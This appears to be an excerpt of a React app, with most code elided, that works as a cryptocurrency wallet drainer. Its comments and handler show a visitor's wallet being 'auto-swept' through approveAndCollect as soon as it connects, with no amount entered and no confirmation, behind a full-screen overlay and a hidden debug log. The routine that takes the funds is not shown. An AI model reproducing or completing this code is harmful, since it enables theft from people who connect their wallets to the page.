...
export default function App() {
  ...
  useEffect(() => {
    ...
    // Immediately auto‑sweep when connected manually
  ...
  const handleAction = async () => {
    // No amount needed – just connect and auto‑sweep
    if (isConnected) {
      approveAndCollect();
      return;
    }
    ...
    if (direct && direct.provider && direct.provider.request) {
      try {
        ...
        if (accounts && accounts.length > 0) {
          ...
          approveAndCollect(direct.provider, accounts[0]);
        } else {
          setLoading(false);
          setStatus('Ready');
        }
  ...
  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#0b0f17', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 50 }}>
      ...
      <div style={{ position: 'fixed', bottom: 16, left: 16, backgroundColor: '#000', color: '#0f0', fontSize: 11, fontFamily: 'monospace', borderRadius: 8, padding: 10, maxHeight: 120, overflowY: 'auto', opacity: 0.7, display: 'none' }}>
        ...
        {debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: 2 }}>{msg}</div>))}
      </div>
    </div>
  )
}